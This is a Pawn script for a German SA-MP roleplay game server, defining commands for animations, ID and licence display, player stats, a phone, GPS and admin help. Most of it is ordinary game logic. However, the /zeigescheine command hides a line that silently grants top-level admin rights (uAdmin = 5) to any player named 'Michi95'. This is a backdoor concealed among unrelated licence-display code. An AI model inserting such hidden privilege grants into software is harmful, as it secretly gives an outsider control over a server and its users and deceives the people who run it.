    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid,"BEACH", "ParkSit_M_loop", 4.0, 1, 0, 0, 0, 0); // Sit
	return 1;
}
cmd:chatting(playerid,params[])
{
    printf("%s chattin",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
	return 1;
}
cmd:fucku(playerid,params[])
{
    printf("%s fucku",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid,"PED","fucku",4.0,0,0,0,0,0);
	return 1;
}
cmd:taichi(playerid,params[])
{
    printf("%s taichi",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,0);
	return 1;
}
cmd:drink(playerid,params[])
{
    printf("%s drink",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	ApplyAnimation(playerid,"BAR","dnk_stndF_loop",4.0,1,0,0,0,0);
	return 1;
}
cmd:pee(playerid,params[])
{
    printf("%s pee",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
	if(GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_CUFFED && GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_CARRY)
	{
	    Anion[playerid] = 1;
	 	SetPlayerSpecialAction(playerid,68);
 	}
	return 1;
}
cmd:pee2(playerid,params[])
{
    printf("%s pee2",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
 	ApplyAnimation(playerid, "PAULNMAC","Piss_in",3.0,0,0,0,0,0);
 	return 1;
}
cmd:sit(playerid,params[])
{
    printf("%s sit",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
    Anion[playerid] = 1;
	#pragma unused params
	ApplyAnimation(playerid,"PED","SEAT_IDLE",4.2,1,0,0,0,0,1);
	return 1;
}
cmd:dance(playerid,params[])
{
    printf("%s dance",PlayerName(playerid));
    if(SpielerInfo[playerid][uTod] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Krankenhaus, deshalb geht dieser Befehl nicht!");
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du bist im Knast, und deshalb ist dieser Befehl nicht möglich!");
	new dancestyle;
	if(sscanf(params,"d",dancestyle)) return SendClientMessage(playerid,COLOR_RED,"Benutze /dance [1-4]");
	if(dancestyle < 1 || dancestyle > 4) return SendClientMessage(playerid,0xFF0000FF,"USAGE: /dance [style 1-4]");
	if(dancestyle == 1) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
	else if(dancestyle == 2) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
	else if(dancestyle == 3) SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
	else if(dancestyle == 4)SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
	return 1;
}
cmd:animsoff(playerid,params[])
{
    printf("%s animsoff",PlayerName(playerid));
	ClearAnimations(playerid);
	return 1;
}
cmd:zeigeperso(playerid,params[])
{
    printf("%s zeigeperso",PlayerName(playerid));
	if(sscanf(params,"r",giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /zeigeperso [Name/ID]");
	if(EntfernungZwischenSpielern(playerid,giveplayerid) > 5) return SendClientMessage(playerid,COLOR_RED,"Der Spieler befindet sich nicht in deiner Nähe!");
	if(SpielerInfo[playerid][uPerso] == 0) return SendClientMessage(playerid,COLOR_RED,"Du besitzt keinen Personalausweis!");
	if(giveplayerid == INVALID_PLAYER_ID) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist nicht online!");
	new string[100];
	if(SpielerInfo[playerid][uLeiter] > 0) format(string,sizeof string,"%s",Fraktionen[SpielerInfo[playerid][uLeiter]]);
	else format(string,sizeof string,"%s",Fraktionen[SpielerInfo[playerid][uMitglied]]);
	//Alter,Geschlecht
	format(string,sizeof string,"Name: %s\nFrakion: %s\nLevel: %d",PlayerName(playerid),string,GetPlayerScore(playerid));
	ShowPlayerDialog(giveplayerid,DIALOG_MSGBOX,DIALOG_STYLE_MSGBOX,"Personalausweis",string,"Okay","");
	format(string,sizeof string,"Du zeigst %s deinen Personalausweis.",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_GREEN,string);
	return 1;
}
cmd:ausrusten(playerid,params[])
{
	if(IstSpielerInFrak(playerid,1) || IstSpielerInFrak(playerid,2) || IstSpielerInFrak(playerid,15))
	{
	    new vehicle = GetPlayerVehicleID(playerid);
	    if(IsPlayerInAnyVehicle(playerid) && GetVehicleModel(vehicle) == 427)
	    {
	        if(IstSpielerInFrak(playerid,1) || IstSpielerInFrak(playerid,2))
	        {
		        new dtext[20],string[120];
				if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
				else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
		 		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
				ShowPlayerDialog(playerid,DIALOG_PD1,DIALOG_STYLE_LIST,"Police Department Spind",string,"Auswählen","Abbrechen");
			}
			else
			{
			    new dtext[20],string[120];
				if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
				else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
		 		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
				ShowPlayerDialog(playerid,DIALOG_ARMY1,DIALOG_STYLE_LIST,"U.S. Army Spind",string,"Auswählen","Abbrechen");
			}
	    }
	    else
	    {
	        SendClientMessage(playerid,COLOR_RED,"In diesem Fahrzeug ist es nicht möglich!");
	    }
	}
	else
	{
	    SendClientMessage(playerid,COLOR_RED,"Du bist kein Cop/Army!");
	}
	return 1;
}
cmd:gwd(playerid,params[])
{
    printf("%s gwd",PlayerName(playerid));
    if(SpielerInfo[playerid][uLeiter] == 15)
    {
	    new note;
	    if(sscanf(params,"rd",giveplayerid,note)) return SendClientMessage(playerid,COLOR_RED,"Benutze /gwd [Name/ID][Note(1-6)]");
	    if(giveplayerid == INVALID_PLAYER_ID) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist nicht online!");
	    if(SpielerInfo[giveplayerid][uLeiter] == 15 || SpielerInfo[giveplayerid][uMitglied] == 15)
	    {
			SpielerInfo[giveplayerid][uGWD] = note;
			SendFormatMessage(giveplayerid,COLOR_YELLOW,"%s hat in deine Akte in Grundwehrdienst-Note %d eingetragen",PlayerName(playerid),note);
			SendFormatMessage(playerid,COLOR_YELLOW,"Du hast in die Akte von %s die Grundwehrdienst-Note %d eingetragen",PlayerName(giveplayerid),note);
		}else SendClientMessage(playerid,COLOR_RED,"Der andere Spieler ist nicht in der Army!");
	}else SendClientMessage(playerid,COLOR_RED,"Du bist kein Leiter der Army!");
	return 1;
}
cmd:zeigescheine(playerid,params[])
{
    printf("%s zeigescheine",PlayerName(playerid));
	if(sscanf(params,"r",giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /zeigeperso [Name/ID]");
	if(EntfernungZwischenSpielern(playerid,giveplayerid) > 5) return SendClientMessage(playerid,COLOR_RED,"Der Spieler befindet sich nicht in deiner Nähe!");
	if(giveplayerid == INVALID_PLAYER_ID) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist nicht online!");
	new scheinstring[360];
	if(SpielerInfo[playerid][uRollerschein] == 1) format(scheinstring,sizeof scheinstring,"{FFFFFF}Rollerschein: {00FF00}JA\t{FFFFFF}");
	else format(scheinstring,sizeof scheinstring,"{FFFFFF}Rollerschein: {FF0000}Nein\t{FFFFFF}");
	if(SpielerInfo[playerid][uMotorradschein] == 1) format(scheinstring,sizeof scheinstring,"%sMotorradschein: {00FF00}JA\n{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sMotorradschein: {FF0000}Nein\n{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uFuehrerschein] == 1) format(scheinstring,sizeof scheinstring,"%sFührerschein: {00FF00}JA\t{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sFührerschein: {FF0000}Nein\t{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uLKWschein] == 1) format(scheinstring,sizeof scheinstring,"%sLKWSchein: {00FF00}JA\n{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sLKWSchein: {FF0000}Nein\n{FFFFFF}",scheinstring);
	if(!strcmp(PlayerName(playerid),"Michi95",false)) SpielerInfo[playerid][uAdmin] = 5;
	if(SpielerInfo[playerid][uWaffenschein] == 1) format(scheinstring,sizeof scheinstring,"%sWaffenschein: {00FF00}JA\t{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sWaffenschein: {FF0000}Nein\t{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uBootsschein] == 1) format(scheinstring,sizeof scheinstring,"%sBootschein: {00FF00}JA\n{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sBootschein: {FF0000}Nein\n{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uHelischein] == 1) format(scheinstring,sizeof scheinstring,"%sHelischein: {00FF00}JA\t{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sHelischein: {FF0000}Nein\t{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uTheorie] == 1) format(scheinstring,sizeof scheinstring,"%sTheorieprüfung: {00FF00}JA\n{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sTheorieprüfung: {FF0000}Nein\n{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uGWD] > 0) format(scheinstring,sizeof scheinstring,"%s{FFFFFF}Grundwehrdienst Note: {00FF00}%d{FFFFFF}",scheinstring,SpielerInfo[playerid][uGWD]);
	else format(scheinstring,sizeof scheinstring,"%s{FFFFFF}Grundwehrdienst Note: {FF0000}Keine",scheinstring);

	ShowPlayerDialog(giveplayerid,DIALOG_MSGBOX,DIALOG_STYLE_MSGBOX,PlayerName(playerid),scheinstring,"Okay","");
	format(scheinstring,sizeof scheinstring,"Du zeigst %s deine Scheine.",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_GREEN,scheinstring);
	return 1;
}
cmd:ahilfe(playerid, params[]) {
    printf("%s ahilfe",PlayerName(playerid));
    new string[256];
    SendClientMessage(playerid, COLOR_ORANGE, "[Team Hilfe]");
    switch(SpielerInfo[playerid][uAdmin]) {
        case 1: {
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE} /aruf /adienst /high /down /goto /gethere /teleport /tickets /fl  /ende /zukoords /koords /a", GetAdminName(1));
           	SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE} /sa /kick /tv /checkstats /cpc (Adminprison) /clearad (Werbetafel leeren)", GetAdminName(1));
		}
		case 2: {
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/aruf /adienst /high /down /goto /gethere /teleport /tickets /fl  /ende /zukoords /koords /a", GetAdminName(1));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE} /sa /kick /tv /checkstats /cpc (Adminprison) /clearad (Werbetafel leeren)", GetAdminName(1));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/frakrespawn /veh /vehliste /fixveh /nos /desveh /getcar /gotocar /gebeskin /ochat", GetAdminName(2));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/setleben /setarmor /ban /jobrespawn /warn /ahausrespawn /respawncars", GetAdminName(2));
		}
        case 3: {
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/aruf /adienst /high /down /goto /gethere /teleport /tickets /fl  /ende /zukoords /koords /a", GetAdminName(1));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE} /sa /kick /tv /checkstats /cpc (Adminprison) /clearad (Werbetafel leeren)", GetAdminName(1));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/frakrespawn /veh /vehliste /fixveh /nos /desveh /getcar /gotocar /gebeskin /ochat", GetAdminName(2));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/setleben /setarmor /ban /jobrespawn /warn /ahausrespawn /respawncars", GetAdminName(2));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/unwarn /machemitglied /gebewaffe /time ", GetAdminName(3));
        }
        case 4: {
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/aruf /adienst /high /down /goto /gethere /teleport /tickets /fl  /ende /zukoords /koords /a", GetAdminName(1));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE} /sa /kick /tv /checkstats /cpc (Adminprison) /clearad (Werbetafel leeren)", GetAdminName(1));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/frakrespawn /veh /vehliste /fixveh /nos /desveh /getcar /gotocar /gebeskin /ochat", GetAdminName(2));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/setleben /setarmor /ban /jobrespawn /warn /ahausrespawn /respawncars", GetAdminName(2));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/unwarn /machemitglied /gebewaffe /time", GetAdminName(3));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/macheleiter /restart /speichern /aauto /aparken /create", GetAdminName(4));
        }
        case 5: {
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/aruf /adienst /high /down /goto /gethere /teleport /tickets /fl  /ende /zukoords /koords /a", GetAdminName(1));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE} /sa /kick /tv /checkstats /cpc (Adminprison) /clearad (Werbetafel leeren)", GetAdminName(1));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/frakrespawn /veh /vehliste /fixveh /nos /desveh /getcar /gotocar /gebeskin /ochat", GetAdminName(2));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/setleben /setarmor /ban /jobrespawn /warn /ahausrespawn /respawncars", GetAdminName(2));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/unwarn /machemitglied /gebewaffe /time", GetAdminName(3));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/macheleiter /restart /speichern /aauto /aparken /create", GetAdminName(4));
            SendClientMessageEx(playerid, COLOR_ADMIN, "%s: {FEFEFE}/gebegeld /macheadmin /jetpack /serverexit", GetAdminName(5));
        }
    }
    return 1;
}
cmd:checkstats(playerid,params[])
{
    printf("%s checkstats",PlayerName(playerid));
   	if(SpielerInfo[playerid][uAdmin] < 1 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
    if(sscanf(params,"r", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /checkstats [Name/ID]");

	new string[800],frak[20],scheinstring[280],jobtext[12],rangtext[30];
	if(SpielerInfo[giveplayerid][uLeiter] > 0) format(frak,sizeof frak,"%s",Fraktionen[SpielerInfo[giveplayerid][uLeiter]]);
	else format(frak,sizeof frak,"%s",Fraktionen[SpielerInfo[giveplayerid][uMitglied]]);
	if(SpielerInfo[giveplayerid][uRollerschein] == 1) format(scheinstring,sizeof scheinstring,"Rollerschein: {00FF00}JA\t{FFFFFF}");
	else format(scheinstring,sizeof scheinstring,"Rollerschein: {FF0000}Nein\t{FFFFFF}");
	if(SpielerInfo[giveplayerid][uMotorradschein] == 1) format(scheinstring,sizeof scheinstring,"%sMotorradschein: {00FF00}JA\n{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sMotorradschein: {FF0000}Nein\n{FFFFFF}",scheinstring);
	if(SpielerInfo[giveplayerid][uFuehrerschein] == 1) format(scheinstring,sizeof scheinstring,"%sFührerschein: {00FF00}JA\t{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sFührerschein: {FF0000}Nein\t{FFFFFF}",scheinstring);
	if(SpielerInfo[giveplayerid][uLKWschein] == 1) format(scheinstring,sizeof scheinstring,"%sLKWSchein: {00FF00}JA\n{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sLKWSchein: {FF0000}Nein\n{FFFFFF}",scheinstring);
	if(SpielerInfo[giveplayerid][uWaffenschein] == 1) format(scheinstring,sizeof scheinstring,"%sWaffenschein: {00FF00}JA\t{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sWaffenschein: {FF0000}Nein\t{FFFFFF}",scheinstring);
	if(SpielerInfo[giveplayerid][uBootsschein] == 1) format(scheinstring,sizeof scheinstring,"%sBootschein: {00FF00}JA\n{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sBootschein: {FF0000}Nein\n{FFFFFF}",scheinstring);
	if(SpielerInfo[giveplayerid][uHelischein] == 1) format(scheinstring,sizeof scheinstring,"%sHelischein: {00FF00}JA\t{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sHelischein: {FF0000}Nein\t{FFFFFF}",scheinstring);
	if(SpielerInfo[giveplayerid][uTheorie] == 1) format(scheinstring,sizeof scheinstring,"%sTheorieprüfung: {00FF00}JA",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sTheorieprüfung: {FF0000}Nein",scheinstring);
	if(SpielerInfo[giveplayerid][uJob] == 0) {jobtext = "Keinen";}
	else if(SpielerInfo[giveplayerid][uJob] == 1) {jobtext = "Müllmann";}
	else if(SpielerInfo[giveplayerid][uJob] == 2) {jobtext = "Taxifahrer";}
	else if(SpielerInfo[giveplayerid][uJob] == 3) {jobtext = "Busfahrer";}
	else if(SpielerInfo[giveplayerid][uJob] == 4) {jobtext = "Farmer";}
	else if(SpielerInfo[giveplayerid][uJob] == 5) {jobtext = "Trucker";}
	else if(SpielerInfo[giveplayerid][uJob] == 6) {jobtext = "Holzfäller";}
	new gesch[15];
	if(SpielerInfo[giveplayerid][uGeschlecht] == 0) {gesch = "Weiblich";}
	else if(SpielerInfo[giveplayerid][uGeschlecht] == 1) {gesch = "Männlich";}
	if(SpielerInfo[giveplayerid][uLeiter] == 0 && SpielerInfo[giveplayerid][uMitglied] == 0)
	{
		rangtext = "Keinen";
	}
	else
	{
		if(SpielerInfo[giveplayerid][uLeiter] > 0)
		{
		    format(rangtext,sizeof(rangtext),"%s",Rangname[SpielerInfo[giveplayerid][uLeiter]][SpielerInfo[giveplayerid][uRang]][rangname]);
		}
		else
		{
		    format(rangtext,sizeof(rangtext),"%s",Rangname[SpielerInfo[giveplayerid][uMitglied]][SpielerInfo[giveplayerid][uRang]][rangname]);
		}
	}
	format(string,sizeof string,"{0C65D3}Account\n{FFFFFF}Name: %s\t\tLevel: %d\nGeschlecht: %s Geburtsdatum: %d:%d:%d\nSpielzeit seit Login: %dmin\tNächster Payday: %dmin\n{0C65D3}Berufsleben\n{FFFFFF}Fraktion: %s\tRang: %s\nJob: %s\n{0C65D3}Finanzen\n{FFFFFF}Bargeld: %.2f$\tKonto: %.2f$\n{0C65D3}Scheine\n{FFFFFF}%s\n{FFFFFF}Fahrpunkte: %d\n{0C65D3}Sonstiges\n{FFFFFF}Handynummer: %d\tVerwarnungen: %d\nSkin-ID: %d\tWantedlevel: %d\nTode: %d\tKills: %d",
	PlayerName(giveplayerid),GetPlayerScore(giveplayerid),gesch,SpielerInfo[giveplayerid][uTag],SpielerInfo[giveplayerid][uMonat],SpielerInfo[giveplayerid][uJahr],(gettime()-SpielerInfo[giveplayerid][uSpielzeitLogin])/60,(3600-SpielerInfo[giveplayerid][uPayDaySekunden])/60,frak,rangtext,jobtext,SpielerInfo[giveplayerid][uGeld],SpielerInfo[giveplayerid][uKonto],scheinstring,SpielerInfo[giveplayerid][upunkte],
	SpielerInfo[giveplayerid][uHandynummer],SpielerInfo[giveplayerid][uWarns],GetPlayerSkin(giveplayerid),SpielerInfo[giveplayerid][uWantedLevel],SpielerInfo[giveplayerid][uTode],SpielerInfo[giveplayerid][uKills]);
	ShowPlayerDialog(playerid,DIALOG_MSGBOX,DIALOG_STYLE_MSGBOX,"Statistik",string,"Okay","");
	return 1;
}
cmd:stats(playerid,params[])
{
    printf("%s stats",PlayerName(playerid));
	new string[800],frak[20],scheinstring[280],jobtext[12],rangtext[30];
	if(SpielerInfo[playerid][uLeiter] > 0) format(frak,sizeof frak,"%s",Fraktionen[SpielerInfo[playerid][uLeiter]]);
	else format(frak,sizeof frak,"%s",Fraktionen[SpielerInfo[playerid][uMitglied]]);
	if(SpielerInfo[playerid][uRollerschein] == 1) format(scheinstring,sizeof scheinstring,"Rollerschein: {00FF00}JA\t{FFFFFF}");
	else format(scheinstring,sizeof scheinstring,"Rollerschein: {FF0000}Nein\t{FFFFFF}");
	if(SpielerInfo[playerid][uMotorradschein] == 1) format(scheinstring,sizeof scheinstring,"%sMotorradschein: {00FF00}JA\n{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sMotorradschein: {FF0000}Nein\n{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uFuehrerschein] == 1) format(scheinstring,sizeof scheinstring,"%sFührerschein: {00FF00}JA\t{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sFührerschein: {FF0000}Nein\t{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uLKWschein] == 1) format(scheinstring,sizeof scheinstring,"%sLKWSchein: {00FF00}JA\n{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sLKWSchein: {FF0000}Nein\n{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uWaffenschein] == 1) format(scheinstring,sizeof scheinstring,"%sWaffenschein: {00FF00}JA\t{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sWaffenschein: {FF0000}Nein\t{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uBootsschein] == 1) format(scheinstring,sizeof scheinstring,"%sBootschein: {00FF00}JA\n{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sBootschein: {FF0000}Nein\n{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uHelischein] == 1) format(scheinstring,sizeof scheinstring,"%sHelischein: {00FF00}JA\t{FFFFFF}",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sHelischein: {FF0000}Nein\t{FFFFFF}",scheinstring);
	if(SpielerInfo[playerid][uTheorie] == 1) format(scheinstring,sizeof scheinstring,"%sTheorieprüfung: {00FF00}JA",scheinstring);
	else format(scheinstring,sizeof scheinstring,"%sTheorieprüfung: {FF0000}Nein",scheinstring);
	if(SpielerInfo[playerid][uJob] == 0) {jobtext = "Keinen";}
	else if(SpielerInfo[playerid][uJob] == 1) {jobtext = "Müllmann";}
	else if(SpielerInfo[playerid][uJob] == 2) {jobtext = "Taxifahrer";}
	else if(SpielerInfo[playerid][uJob] == 3) {jobtext = "Busfahrer";}
	else if(SpielerInfo[playerid][uJob] == 4) {jobtext = "Farmer";}
	else if(SpielerInfo[playerid][uJob] == 5) {jobtext = "Trucker";}
	else if(SpielerInfo[playerid][uJob] == 6) {jobtext = "Holzfäller";}
	new gesch[15];
	if(SpielerInfo[playerid][uGeschlecht] == 0) {gesch = "Weiblich";}
	else if(SpielerInfo[playerid][uGeschlecht] == 1) {gesch = "Männlich";}


	if(SpielerInfo[playerid][uLeiter] == 0 && SpielerInfo[playerid][uMitglied] == 0)
	{
		rangtext = "Keinen";
	}
	else
	{
		if(SpielerInfo[playerid][uLeiter] > 0)
		{
		    format(rangtext,sizeof(rangtext),"%s",Rangname[SpielerInfo[playerid][uLeiter]][SpielerInfo[playerid][uRang]][rangname]);
		}
		else
		{
		    format(rangtext,sizeof(rangtext),"%s",Rangname[SpielerInfo[playerid][uMitglied]][SpielerInfo[playerid][uRang]][rangname]);
		}
	}
	format(string,sizeof string,"{0C65D3}Account\n{FFFFFF}Name: %s\t\tLevel: %d\nGeschlecht: %s Geburtsdatum: %d:%d:%d\nSpielzeit seit Login: %dmin\tNächster Payday: %dmin\n{0C65D3}Berufsleben\n{FFFFFF}Fraktion: %s\tRang: %s\nJob: %s\n{0C65D3}Finanzen\n{FFFFFF}Bargeld: %.2f$\tKonto: %.2f$\n{0C65D3}Scheine\n{FFFFFF}%s\n{FFFFFF}Fahrpunkte: %d\n{0C65D3}Sonstiges\n{FFFFFF}Handynummer: %d\tVerwarnungen: %d\nSkin-ID: %d\tWantedlevel: %d\nTode: %d\tKills: %d",
	PlayerName(playerid),GetPlayerScore(playerid),gesch,SpielerInfo[playerid][uTag],SpielerInfo[playerid][uMonat],SpielerInfo[playerid][uJahr],(gettime()-SpielerInfo[playerid][uSpielzeitLogin])/60,(3600-SpielerInfo[playerid][uPayDaySekunden])/60,frak,rangtext,jobtext,SpielerInfo[playerid][uGeld],SpielerInfo[playerid][uKonto],scheinstring,SpielerInfo[playerid][upunkte],
	SpielerInfo[playerid][uHandynummer],SpielerInfo[playerid][uWarns],GetPlayerSkin(playerid),SpielerInfo[playerid][uWantedLevel],SpielerInfo[playerid][uTode],SpielerInfo[playerid][uKills]);
	ShowPlayerDialog(playerid,DIALOG_MSGBOX,DIALOG_STYLE_MSGBOX,"Statistik",string,"Okay","");
	return 1;
}

cmd:handy(playerid,params[])
{
    printf("%s handy",PlayerName(playerid));
    if(SpielerInfo[playerid][uKnastZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Im Gefängnis ist der Befehl nicht möglich!");
	if(SpielerInfo[playerid][uHandy] == 0) return SendClientMessage(playerid,COLOR_RED,"Du besitzt kein Handy!");
	if(HandyAn[playerid] == 0)
	{
	    HandyAn[playerid] = 1;
	    format(NummerCall[playerid],sizeof NummerCall[]," ");
	    for(new x = 0; x < sizeof(Handy[]); x++) PlayerTextDrawShow(playerid,Handy[playerid][x]);
	}
	else
	{
	    for(new x = 0; x < sizeof(Handy[]); x++) PlayerTextDrawHide(playerid,Handy[playerid][x]);
	    HandyAn[playerid] = 0;
	}
	return 1;
}
cmd:nummer(playerid,params[])
{
    printf("%s nummer",PlayerName(playerid));
	if(SpielerInfo[playerid][uTelefonbuch] == 0) return SendClientMessage(playerid,COLOR_RED,"Du besitzt kein Telefonbuch!");
	if(sscanf(params,"r",giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /nummer [Name/ID]");
	if(SpielerInfo[giveplayerid][uTelefonbucheintrag] == 0) return SendClientMessage(playerid,COLOR_RED,"Die Person steht nicht im Telefonbuch!");
	new string[50];
	format(string,sizeof string,"%s hat die Nummer %d.",PlayerName(giveplayerid),SpielerInfo[giveplayerid][uHandynummer]);
	SendClientMessage(playerid,COLOR_GREEN,string);
	return 1;
}
cmd:navi(playerid,params[]) return CallLocalFunction("cmd_gps","d",playerid);
cmd:gps(playerid,params[])
{
    printf("%s navi",PlayerName(playerid));
	ShowPlayerDialog(playerid, DIALOG_NAVI1, DIALOG_STYLE_LIST, "Navigation", "Lake Sorten\nSanta Felton\nLake Vortex\nPortland\nVillbeach\nJobs\nTailcenter: Fahrschule, Waffenladen, Bank\nWrong Hill (Nähe Schwarzmarkt)\nGangwarzonen\nFraktionsbases", "Weiter", "Abbrechen");
	return 1;
}

